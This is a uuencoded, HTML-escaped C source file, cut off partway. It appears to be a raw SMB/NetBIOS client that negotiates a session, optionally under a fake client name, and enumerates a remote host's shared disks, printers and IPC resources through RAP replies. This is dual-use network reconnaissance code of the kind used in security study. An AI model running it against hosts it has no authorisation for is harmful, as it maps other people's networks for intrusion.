M+3Y#;VUM86YD/2!#;V1E.PT*#0H@4VUB0F%S92T^1FQA9W,],&#039;@P.#L-&quot;GT-
M&quot;@T*+RI4;R!E;F-O9&amp;4@82!.151&quot;24]3(&amp;YA;64J+PT*#0IV;VED($YE=$)I
M;W-.86UE16YC;V1I;F&lt;H8VAA&lt;B`J3F%M92P@8VAA&lt;B`J3F5T0FEO&lt;TYA;64I
M#0I[#0H@:6YT(&amp;DL:CTP.PT*(`T*+RI&quot;969O&lt;F4@=&amp;AE(&amp;5N8V]D960@3D54
M0DE/4R!N86UE+&quot;!T:&amp;5R92!I&lt;R!T:&amp;4@=F%L=64@.B`P&gt;#(P*B\@#0H@#0H@
M3F5T0FEO&lt;TYA;65;,%T],&#039;@R,#L-&quot;B`-&quot;B!F;W(H:3TQ(#L@:2`\(#,S(#L@
M:2LK*0T*(&#039;L-&quot;B`@3F5T0FEO&lt;TYA;65;:5T@/2`H($YA;65;:ET@/CX@-&quot;`I
M(&quot;L@,&#039;@T,2`[#0H@($YE=$)I;W-.86UE6VDK,5T@/2`H3F%M95MJ72`F(#!X
M,&amp;8I(&quot;L@,&#039;@T,2`[#0H@(&amp;DK*SL-&quot;B`@:BLK.PT*(&#039;T-&quot;@T*(&quot;\J070@=&amp;AE
M(&amp;5N9&quot;!O9B!T:&amp;4@96YC;V1E9&quot;!.151&quot;24]3(&amp;YA;64L(&#039;1H97)E(&amp;ES(&#039;1H
M92!V86QU93H@,&#039;@P,&quot;HO#0H@#0H@3F5T0FEO&lt;TYA;65;,S-=/3!X,#`[#0H@
M#0I]#0H-&quot;B\J*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*B\-&quot;@T*+RH@5&amp;AI&lt;R!F
M=6YC=&amp;EO;B!I&lt;R!U&lt;V5D(&#039;1O(&#039;)E8V5I=F4@=&amp;AE($YE9U!R;W0@4F5P;&#039;D@
M#0H@*B!A;F0@=&amp;\@:6YT97)P&lt;F5T(&amp;ET+@T*(&quot;H@5V4@=7-E(&#039;1H:7,@9G5N
M8W1I;VX@=&amp;\@:&amp;%V92!T:&amp;4@4TU&quot;(&amp;1O;6%I;DYA;64@*B\@#0H-&quot;F-H87(@
M*E)E8V5I=F5.96=0&lt;F]T4F5P;&#039;DH#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;\J($]U&lt;B!S;V-K970J+PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;!I;G0@4V]C:RP-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@+RI4:&amp;4@
M9&amp;]M86EN(&amp;YA;64@&lt;W1R:6YG(&amp;QE;F=T:&quot;HO#0H)&quot;0D@(&amp;EN=&quot;`J1&amp;]M86EN
M3F%M94QE;F=T:&quot;D-&quot;GL-&quot;@T*(&amp;EN=&quot;!086-K971,96YG=&amp;@[#0H-&quot;B!U7V-H
M87(@*E!A8VME=#L-&quot;B!U7V-H87(@*D1O;6%I;DYA;64[#0H@=5]I;G0Q-E]T
M(%-I&gt;F4[#0H@#0H@3F)T4V5S&lt;VEO;DAD&lt;B!.8G1397-S:6]N.PT*#0H@4VUB
M3F5G4&#039;)O=%)E&lt;&amp;QY2&amp;1R(&quot;I3;6).96=0&lt;F]T4F5P;&#039;D[#0H-&quot;B\J4F5C96EV
M92!T:&amp;4@3F5T8FEO&lt;R!(96%D97(@=&amp;\@#0H@*B!K;F]W(&#039;1H92!C;W5N=&quot;!O
M9B!D871A&lt;R!B&gt;71E&lt;RHO#0H-&quot;B!R96%D*%-O8VLL)DYB=%-E&lt;W-I;VXL&lt;VEZ
M96]F*$YB=%-E&lt;W-I;VY(9&#039;(I*3L-&quot;@T*(%!A8VME=$QE;F=T:&quot;`](&amp;YT;VAS
M*$YB=%-E&lt;W-I;VXN3&amp;5N9W1H*3L@#0H-&quot;B\J5&amp;\@:&amp;%V92!T:&amp;4@4TU&quot;($)A
M&lt;V4@:&amp;5A9&amp;5R+&#039;1H92!334(@3F5G4&#039;)O=&quot;!297!L&gt;2!A;F0@9&amp;%T87,J+PT*
M#0H@4&amp;%C:V5T(#T@*&#039;5?8VAA&lt;B`J*2`H;6%L;&amp;]C*%!A8VME=$QE;F=T:&quot;`J
M(&#039;-I&gt;F5O9BAU7V-H87(I*2D[#0H-&quot;B!R96%D*%-O8VLL4&amp;%C:V5T+%!A8VME
M=$QE;F=T:&quot;D[#0H-&quot;B!3;6).96=0&lt;F]T4F5P;&#039;D@/2`H4VUB3F5G4&#039;)O=%)E
M&lt;&amp;QY2&amp;1R(&quot;HI(`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;A086-K970@*PT*(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S:7IE;V8H4VUB0F%S94AD&lt;BDI.PT*#0HO*B!4
M;R!H879E(&#039;1H92!S:7IE(&amp;]F(&#039;1H92!$;VUA:6X@;F%M92!S=&#039;)I;F&lt;J+PT*
M#0H@;65M8W!Y*&quot;93:7IE+%-M8DYE9U!R;W1297!L&gt;2T^0GET94-O=6YT+&#039;-I
M&gt;F5O9BAU7VEN=#$V7W0I*3L-&quot;@T*(&quot;I$;VUA:6Y.86UE3&amp;5N9W1H(#T@(&quot;`@
M4VEZ92`M(`T*&quot;0D)4VUB3F5G4&#039;)O=%)E&lt;&amp;QY+3Y%;F-R&gt;7!T:6]N2V5Y3&amp;5N
M9W1H.PT*#0H@1&amp;]M86EN3F%M92`](&quot;AU7V-H87(@*BD@*&amp;UA;&amp;QO8R@J1&amp;]M
M86EN3F%M94QE;F=T:&quot;`J(&#039;-I&gt;F5O9BAU7V-H87(I*2D[#0H-&quot;B\J0V]P&gt;2!T
M:&amp;4@1&amp;]M86EN(&amp;YA;64@:6X@82!S=&#039;)I;F&lt;J+PT*#0H@;65M8W!Y*$1O;6%I
M;DYA;64L#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@*&#039;5?8VAA&lt;B`J*2`-&quot;B`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`H4&amp;%C:V5T(&quot;L@#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&#039;-I&gt;F5O9BA3;6)&quot;87-E2&amp;1R*2`K(`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S
M:7IE;V8H4VUB3F5G4&#039;)O=%)E&lt;&amp;QY2&amp;1R*0T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`K(%-M8DYE9U!R;W1297!L&gt;2T^16YC&lt;GEP=&amp;EO;DME&gt;4QE;F=T:&quot;DL#0H@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;I$;VUA:6Y.86UE3&amp;5N9W1H*3L-&quot;B`-&quot;B!R
M971U&lt;FX@1&amp;]M86EN3F%M93L-&quot;GT-&quot;@T*+RHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ+PT*#0HO*E1H:7,@9G5N8W1I;VX@:7,@=7-E9&quot;!T;R!H879E(&#039;1H92!4
M8V]N&gt;&quot;!297!L&gt;2P@#0H@*B!A;F0@=&amp;\@:&amp;%V92!S;VUE(&amp;EN9F]R;6%T:6]N
M#0H@*B!L:6ME(&#039;1H92!4:60@9FEE;&amp;0J+PT*#0H-&quot;G9O:60@4F5C96EV951C
M;VY84F5P;&#039;DH#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;\J3W5R(&#039;-O8VME
M=&quot;HO#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;EN=&quot;!3;V-K+`T*(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`O*E1H92!4240@9FEE;&amp;0J+PT*(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!U7VEN=#A?=&quot;`J5&amp;ED*0T*&gt;PT*#0H@:6YT(%!A8VME
M=$QE;F=T:#L-&quot;@T*(&#039;5?8VAA&lt;B`J4&amp;%C:V5T.PT*(`T*($YB=%-E&lt;W-I;VY(
M9&#039;(@3F)T4V5S&lt;VEO;CL-&quot;@T*(%-M8D)A&lt;V5(9&#039;(@*E-M8D)A&lt;V4[#0H-&quot;B`-
M&quot;B`O*B!4;R!K;F]W(&#039;1H92!C;W5N=&quot;!O9B!D871A(&amp;)Y=&amp;5S*B\-&quot;@T*(&#039;)E
M860H4V]C:RPF3F)T4V5S&lt;VEO;BQS:7IE;V8H3F)T4V5S&lt;VEO;DAD&lt;BDI.PT*
M#0H@4&amp;%C:V5T3&amp;5N9W1H(#T@;G1O:&#039;,H3F)T4V5S&lt;VEO;BY,96YG=&amp;@I.R`-
M&quot;@T*+RI792!R96-E:79E(&#039;1H92!334(@0F%S92!H96%D97(L(%1C;VYX(&#039;)E
M&lt;&amp;QY(&amp;AE861E&lt;B!A;F0@9&amp;%T87,J+PT*#0H@4&amp;%C:V5T(#T@*&#039;5?8VAA&lt;B`J
M*2`H;6%L;&amp;]C*%!A8VME=$QE;F=T:&quot;`J(&#039;-I&gt;F5O9BAU7V-H87(I*2D[#0H-
M&quot;B!R96%D*%-O8VLL4&amp;%C:V5T+%!A8VME=$QE;F=T:&quot;D[#0H-&quot;B!3;6)&quot;87-E
M(#T@*%-M8D)A&lt;V5(9&#039;(@*B`I(&quot;A086-K970I.PT*#0HO*E1O(&amp;AA=F4@=&amp;AE
M(%1I9&quot;!F:65L9&quot;HO#0H-&quot;B!M96UC&lt;&#039;DH5&amp;ED+%-M8D)A&lt;V4M/E1I9&quot;PR*G-I
M&gt;F5O9BAU7VEN=#A?=&quot;DI.PT*#0H@9G)E92A086-K970I.PT*#0I]#0H-&quot;B\J
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*B\@#0H-&quot;B\J06YA;&#039;ES:7,@;V8@=&amp;AE
M(&#039;1R86YS86-T:6]N(&amp;%N9&quot;!205`@8V]M;6%N9&#039;,@&lt;F5P;&#039;DJ+PT*#0HO*D1E
M9FEN92!T:&amp;4@4TA!4D5?24Y&amp;3R!S=&#039;)U8W1U&lt;F4J+PT*(&#039;1Y&lt;&amp;5D968@&lt;W1R
M=6-T#0H@&gt;PT*(&quot;!U7V-H87(@3F5T3F%M95LQ,UT[#0H@(&#039;5?8VAA&lt;B!0860[
M#0H@(&#039;5?:6YT,39?=&quot;!4&gt;7!E.PT*(&quot;!U7VEN=#,R7W0@4F5M87)K.PT*(&#039;T@
M4VAA&lt;F5);F9O.PT*#0HO*E-P96-I86P@&lt;W1R=6-T=7)E(&amp;9O&lt;B!T:&amp;4@4D%0
M(&#039;)E&lt;W!O;G-E(&#039;!A&lt;F%M971E&lt;G,J+PT*#0H@=&#039;EP961E9B!S=&#039;)U8W0-&quot;B![
M#0H@(&#039;5?:6YT.%]T(%-T871U&lt;ULR73L-&quot;B`@=5]I;G0X7W0@0V]N=F5R=&amp;5R
M6S)=.PT*(&quot;!U7VEN=#A?=&quot;!%;G1R:65S4F5T=7)N961;,ET[#0H@(&#039;5?:6YT
M.%]T($5N=&#039;)I97-!=F%I;&amp;%B;&amp;5;,ET[#0H@?2!297!L&gt;5!A&lt;F%M971E&lt;G,[
M#0H-&quot;G9O:60@4F5C96EV951R86YS4F5P;&#039;DH#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;\J3W5R(&#039;-O8VME=&quot;HO#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&amp;EN=&quot;!3;V-K*0T*&gt;PT*(&amp;EN=&quot;!086-K971,96YG=&amp;@[#0H-&quot;B!U7V-H87(@
M*E!A8VME=#L-&quot;@T*+RI%;G1R:65S(&amp;%V86EL86)L92P@;G5M8F5R(&amp;]F(%-(
M05)%7TE.1D\@&lt;W1R=6-T=7)E&lt;RHO#0H@#0H@=5]I;G0Q-E]T($5N=&#039;)I97,[
M#0H@#0H@3F)T4V5S&lt;VEO;DAD&lt;B!.8G1397-S:6]N.PT*#0H@4VUB5&#039;)A;G-2
M97!L&gt;4AD&lt;B`J4VUB5&#039;)A;G-297!L&gt;3L-&quot;@T*(&#039;5?:6YT,39?=&quot;!$:7-P;&amp;%C
M96UE;G0[#0H-&quot;B!3:&amp;%R94EN9F\@*E-H87)E.PT*#0H@4F5P;&#039;E087)A;65T
M97)S(&quot;I297!L&gt;3L-&quot;@T*(&amp;EN=&quot;!I.PT*(`T*+RI4;R!R96-E:79E(&#039;1H92!.
M971B:6]S(&amp;AE861E&lt;B!A;F0@#0IT;R!K;F]W(&#039;1H92!C;W5N=&quot;!O9B!D871A
M(&amp;)Y=&amp;5S*B\-&quot;@T*(&#039;)E860H4V]C:RPF3F)T4V5S&lt;VEO;BQS:7IE;V8H3F)T
M4V5S&lt;VEO;DAD&lt;BDI.PT*#0H@4&amp;%C:V5T3&amp;5N9W1H(#T@;G1O:&#039;,H3F)T4V5S
M&lt;VEO;BY,96YG=&amp;@I.R`-&quot;@T*+RI4;R!R96-E:79E(&#039;1H92!3;6(@0F%S92!(
M96%D97(L(`T*(&quot;H@=&amp;AE(%-M8B!4&lt;F%N&lt;V%C=&amp;EO;B!297!L&gt;2P@86YD(&#039;1H
M92`-&quot;B`J(%)!4&quot;!C;VUM86YD(&#039;)E&lt;W!O;G-E*B\-&quot;@T*(%!A8VME=&quot;`](&quot;AU
M7V-H87(@*BD@*&amp;UA;&amp;QO8RA086-K971,96YG=&amp;@@*B!S:7IE;V8H=5]C:&amp;%R
M*2DI.PT*#0H@&lt;F5A9&quot;A3;V-K+%!A8VME=&quot;Q086-K971,96YG=&amp;@I.PT*#0HO
M*E1O(&amp;AA=F4@=&amp;AE(%)!4&quot;!P87)A;65T97)S(&amp;1I&lt;W!L86-E;65N=&quot;HO#0H@
M#0H@4VUB5&#039;)A;G-297!L&gt;2`](&quot;A3;6)4&lt;F%N&lt;U)E&lt;&amp;QY2&amp;1R(&quot;HI(`T*(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`H4&amp;%C:V5T(&quot;L-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#039;-I
M&gt;F5O9BA3;6)&quot;87-E2&amp;1R*2D[#0H@;65M8W!Y*&quot;9$:7-P;&amp;%C96UE;G0L#0H@
M(&quot;`@(&quot;`@(%-M8E1R86YS4F5P;&#039;DM/E!A&lt;F%M971E&lt;D]F9G-E=&quot;P-&quot;B`@(&quot;`@
M(&quot;`@&lt;VEZ96]F*&#039;5?:6YT,39?=&quot;DI.PT*#0H@4F5P;&#039;D@/2`@*%)E&lt;&amp;QY4&amp;%R
M86UE=&amp;5R&lt;R`J(&quot;D@*&quot;!086-K970@*R!$:7-P;&amp;%C96UE;G0I.PT*(&quot;`-&quot;B!M
M96UC&lt;&#039;DH*&#039;5?8VAA&lt;BHI(&quot;@F16YT&lt;FEE&lt;RDL#0H@(&quot;`@(&quot;`@(&quot;`H=5]C:&amp;%R
M(&quot;HI(&quot;A297!L&gt;2T^16YT&lt;FEE&lt;T%V86EL86)L92DL#0H@(&quot;`@(&quot;`@(&quot;!S:7IE
M;V8H=5]I;G0Q-E]T*2D[#0H-&quot;B`O*DEN:71I86QI&gt;F4@82!P;VEN=&amp;5R(&#039;1O
M(&#039;1H92!S979E&lt;F%L(&#039;-H87)E(&amp;EN9F\@&lt;W1R=6-T=7)E&lt;RHO#0H-&quot;B!3:&amp;%R
M92`](&quot;@@4VAA&lt;F5);F9O(&quot;H@*2`H;6%L;&amp;]C*$5N=&#039;)I97,@*B!S:7IE;V8H
M4VAA&lt;F5);F9O*2DI.PT*#0H@;65M8W!Y*%-H87)E+&quot;AU7V-H87(@*BD@*%!A
M8VME=&quot;`@*PT*&quot;0D)(&quot;!$:7-P;&amp;%C96UE;G0@*PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;!S:7IE;V8H4F5P;&#039;E087)A;65T97)S*2DL(`T*(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!%;G1R:65S(&quot;H@&lt;VEZ96]F*%-H87)E26YF
M;RDI.PT*#0HO*E!R:6YT(&#039;1O(&#039;-C&lt;F5E;B!T:&amp;4@&lt;V5V97)A;&quot;!I;F9O&lt;FUA
M=&amp;EO;BHO#0H-&quot;B!F;W(H:3TP.VD\16YT&lt;FEE&lt;SMI*RLI#0H@&gt;PT*(&quot;!P&lt;FEN
M=&amp;8H(EQN3F%M92`Z(&quot;5S(BQ3:&amp;%R95MI72Y.971.86UE*3L-&quot;B`@&lt;W=I=&amp;-H
M*%-H87)E6VE=+E1Y&lt;&amp;4I#0H@(&#039;L-&quot;B`@(&amp;-A&lt;V4@,#H@#0H@(&quot;`@&lt;&#039;)I;G1F
M*&quot;)&lt;;D1I&lt;VL@9&amp;ER96-T;W)Y(&#039;1R964B*3L-&quot;B`@(&quot;!B&lt;F5A:SL-&quot;B`@(&quot;`-
M&quot;B`@(&amp;-A&lt;V4@,3H@#0H@(&quot;`@&lt;&#039;)I;G1F*&quot;)&lt;;E!R:6YT97(@&lt;75E=64B*3L-
M&quot;B`@(&quot;!B&lt;F5A:SL-&quot;B`@(&quot;`-&quot;B`@(&amp;-A&lt;V4@,CH@#0H@(&quot;`@&lt;&#039;)I;G1F*&quot;)&lt;
M;D-O;6UU;FEC871I;VYS(&amp;1E=FEC92(I.PT*(&quot;`@(&amp;)R96%K.PT*(&quot;`@(`T*
M(&quot;`@8V%S92`S.B`-&quot;B`@(&quot;!P&lt;FEN=&amp;8H(EQN25!#(BD[#0H@(&quot;`@8G)E86L[
M#0H@(&#039;T-&quot;B`@#0H@(&#039;!R:6YT9B@B7&amp;Y296UA&lt;FL@.B`E&lt;UQN7&amp;XB+&quot;@H=5]C
M:&amp;%R(&quot;HI(`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`H4&amp;%C:V5T(&quot;L@
M1&amp;ES&lt;&amp;QA8V5M96YT(&quot;L@#0H)&quot;0D@(&quot;!S:7IE;V8H4F5P;&#039;E087)A;65T97)S
M*2`K#0H)&quot;0D@(&quot;!3:&amp;%R95MI72Y296UA&lt;FLI*2D[#0H@(&quot;`-&quot;B!]#0I]#0H-
M&quot;B\J*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*B\-&quot;@T*+RI4:&amp;ES(&amp;9U;F-T:6]N
M(&amp;ES(&#039;5S960@=&amp;\@:6YJ96-T(&#039;1H92!.151&quot;24]3(&#039;!A8VME=&quot;`@#0H@*B`@
M=VET:&quot;!T:&amp;4@96YC;V1E9&quot;!.151&quot;24]3(&amp;YA;64@;V8-&quot;B`J(&#039;1H92!C;&amp;EE
M;G0@*&#039;1H870@8V]U;&amp;0@8F4@9F%K92D-&quot;B`J(&amp;%N9&quot;!T:&amp;4@&lt;V5R=F5R)W,@
M25`@861R97-S*B\-&quot;B`-&quot;G9O:60@4V5N9$YE=$)I;W-.86UE4F5Q=65S=&quot;@-
M&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`O*D]U&lt;B!S;V-K970@*B\-
M&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!I;G0@4V]C:RP-&quot;B`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`O*E1H92!C;&amp;EE;G0G&lt;R!N86UE*B\-
M&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!C:&amp;%R(&quot;I#;&amp;EE;G0L#0H@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@+RI334(@&lt;V5R=F5R)W,@25`J
M+PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;-H87(@*E--0E-E&lt;G9E
M&lt;BD-&quot;GL-&quot;B\J5&amp;AE(&#039;!A8VME=&quot;!T;R!I;FIE8W0J+PT*#0H@=5]C:&amp;%R(&quot;I0
M86-K970[#0H-&quot;B\J5&amp;AE($Y%5$))3U,@:&amp;5A9&amp;5R*B\-&quot;@T*($YB=%-E&lt;W-I
M;VY(9&#039;(@*DYB=%-E&lt;W-I;VX[#0H@#0HO*E--0B!S97)V97(G&lt;R!.151&quot;24]3
M(&amp;5N8V]D960@;F%M92HO#0H@#0H@8VAA&lt;B!.0E1397)V97);,S1=.PT*(`T*
M+RI#;&amp;EE;G0G&lt;R!.151&quot;24]3(&amp;5N8V]D960@;F%M92HO#0H@#0H@8VAA&lt;B!.
M0E1#;&amp;EE;G1;,S1=.PT*#0HO*D5N8V]D92!T:&amp;4@8VQI96YT)W,@;F%M92HO
M(`T*(`T*($YE=$)I;W-.86UE16YC;V1I;F&lt;H0VQI96YT+$Y&quot;5$-L:65N=&quot;D[
M#0H-&quot;B\J16YC;V1E(&#039;1H92!S97)V97(G&lt;R!N86UE*B\-&quot;B`-&quot;B!.971&quot;:6]S
M3F%M945N8V]D:6YG*%--0E-E&lt;G9E&lt;BQ.0E1397)V97(I.PT*#0HO*D]+(&amp;QE
M=&quot;=S(&amp;)U:6QD(&#039;1H92!P86-K970J+PT*#0H@4&amp;%C:V5T(#T@*&#039;5?8VAA&lt;B`J
M*2`H;6%L;&amp;]C*`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S:7IE
M;V8H3F)T4V5S&lt;VEO;BD@*PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;!S:7IE;V8H3D)44V5R=F5R*2`K#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&#039;-I&gt;F5O9BA.0E1#;&amp;EE;G0I*2D[#0H-&quot;B\J5&amp;AE($Y%5$))3U,@
M:&amp;5A9&amp;5R*B\-&quot;B`-&quot;B!.8G1397-S:6]N(#T@*$YB=%-E&lt;W-I;VY(9&#039;(@*BD@
M*%!A8VME=&quot;D[#0H-&quot;B\J5&#039;EP97,@/2`P&gt;#@Q(%-E&lt;W-I;VX@&lt;F5Q=65S=&quot;HO
M#0H-&quot;B!.8G1397-S:6]N+3Y4&gt;7!E(#T@,&#039;@X,3L-&quot;@T*+RI&amp;;&amp;%G&lt;R`]($Y/
M3D4J+PT*(`T*($YB=%-E&lt;W-I;VXM/D9L86=S(#T@,&#039;@P,#L-&quot;@T*+RI,96YG
M=&amp;@@/2!S:7IE(&amp;]F(&#039;1H92!T=V\@3D540DE/4R!E;F-O9&amp;5D(&amp;YA;65S(#T@
M-C0@8GET97,J+PT*#0H@3F)T4V5S&lt;VEO;BT^3&amp;5N9W1H(#T@;G1O:&#039;,H&lt;VEZ
M96]F*$Y&quot;5%-E&lt;G9E&lt;BD@*R!S:7IE;V8H3D)40VQI96YT*2D[#0H-&quot;B\J0G5I
M;&amp;0@=&amp;AE(&#039;!A8VME=&quot;P@&gt;6]U(&amp;UU&lt;W0@&lt;F5S&lt;&amp;5C=&quot;!T:&amp;ES(&amp;]R9&amp;5R(#H-
M&quot;B`J(&#039;1H92!.151&quot;24]3(&#039;-E&lt;W-I;VX@:&amp;5A9&amp;5R+`T*(&quot;H@=&amp;AE(&#039;-E&lt;G9E
M&lt;B=S($Y%5$))3U,@96YC;V1E9&quot;!N86UE(&quot;P-&quot;B`J(&amp;9O;&amp;QO=VEN9R!B&gt;2!T
M:&amp;4@8VQI96YT)W,@3D540DE/4R!E;F-O9&amp;5D(&amp;YA;64L(`T*(&quot;H@5&amp;AA=&quot;=S
M(&amp;%L;&quot;!F;VQK&lt;R`J+PT*#0HO*E1H92!E;F-O9&amp;5D($Y%5$))3U,@;F%M92!O
M9B!T:&amp;4@&lt;V5R=F5R(&amp;ES(&amp;%F=&amp;5R(&#039;1H92!.151&quot;24]3(&amp;AE861E&lt;BHO#0H-
M&quot;B!M96UC&lt;&#039;DH#0H@(&quot;`@(&quot;`@(&quot;\J069T97(@=&amp;AE($Y%5$))3U,@2&amp;5A9&amp;5R
M*B\-&quot;B`@(&quot;`@(&quot;`@*&#039;5?8VAA&lt;B`J*2`H4&amp;%C:V5T(&quot;L@&lt;VEZ96]F*$YB=%-E
M&lt;W-I;VY(9&#039;(I*2P-&quot;@DO*E=E(&#039;!U=&quot;!T:&amp;4@&lt;V5R=F5R)W,@3D540DE/4R!E
M;F-O9&amp;5D(&amp;YA;64J+PT*(&quot;`@(&quot;`@(&quot;!.0E1397)V97(L#0H@(&quot;`@(&quot;`@(&#039;-I
M&gt;F5O9BA.0E1397)V97(I*3L-&quot;B`-&quot;B`@#0H@;65M8W!Y*`T*(&quot;`@(&quot;`@(&quot;`O
M*D%F=&amp;5R(&#039;1H92!S97)V97(G&lt;R!.151&quot;24]3(&amp;5N8V]D960@;F%M92HO#0H@
M(&quot;`@(&quot;`@(&quot;AU7V-H87(@*BD@*%!A8VME=&quot;`K(`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;!S:7IE;V8H3F)T4V5S&lt;VEO;DAD&lt;BD@*PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;!S:7IE;V8H3D)44V5R=F5R*2DL#0H)+RI792!P=70@=&amp;AE(&amp;-L:65N
M=&quot;=S($Y%5$))3U,@96YC;V1E9&quot;!N86UE*B\-&quot;B`@(&quot;`@(&quot;`@3D)40VQI96YT
M+`T*(&quot;`@(&quot;`@(&quot;!S:7IE;V8H3D)40VQI96YT*2D[#0H-&quot;B`O*E=R:71E(&#039;1H
M92!P86-K970@=&amp;\@=&amp;AE(&#039;=I&lt;F4J+PT*#0H@=W)I=&amp;4H4V]C:RP@4&amp;%C:V5T
M+&quot;!S:7IE;V8H3F)T4V5S&lt;VEO;DAD&lt;BD@*PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@&lt;VEZ96]F*$Y&quot;5$-L:65N=&quot;D@*PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M&lt;VEZ96]F*$Y&quot;5%-E&lt;G9E&lt;BDI.PT*?0T*#0HO*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHO#0H-&quot;B\J(%1H:7,@9G5N8W1I;VX@&lt;V5N9&#039;,@82!N96=P&lt;F]T(&#039;)E
M&lt;75E&lt;W0@4&amp;%C:V5T*B\-&quot;@T*=F]I9&quot;!396YD3F5G4&#039;)O=%)E&lt;75E&lt;W0H#0H@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`O*D]U&lt;B!S;V-K970J+PT*(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@:6YT(%-O8VLI#0I[#0H@=5]C:&amp;%R(&quot;I086-K
M970[#0H@#0H@:6YT(%!A8VME=$QE;F=T:#L-&quot;@T*(%-M8DYE9U!R;W1297%U
M97-T2&amp;1R(&quot;I.96=297%U97-T.PT*#0H@+RH@5&amp;AE(&#039;1O=&amp;%L(&amp;QE;F=T:&quot;!O
M9B`Z#0H@(&quot;H@4VUB($)A&lt;V4@2&amp;5A9&amp;5R(&quot;L@4VUB($YE9W!R;W0@4F5Q=65S
M=`T*(&quot;`K($1I86QE8W0@&lt;W1R:6YG(&quot;HO#0H-&quot;@T*4&amp;%C:V5T3&amp;5N9W1H(#T)
M&lt;VEZ96]F*%-M8D)A&lt;V5(9&#039;(I(&quot;L@#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;VEZ96]F
M*%-M8DYE9U!R;W1297%U97-T2&amp;1R*2`K#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;VEZ
